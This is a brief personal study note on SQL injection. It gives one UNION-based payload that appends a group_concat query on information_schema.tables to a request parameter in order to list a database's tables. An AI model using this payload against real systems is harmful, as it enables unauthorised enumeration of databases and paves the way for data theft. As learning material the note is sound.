# Learning SQL Injection

Just taking some notes about different SQL Injections.

---------------------------------------------

### Add the command after the last parameter

#### > This will display the tables
```
UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()--
```
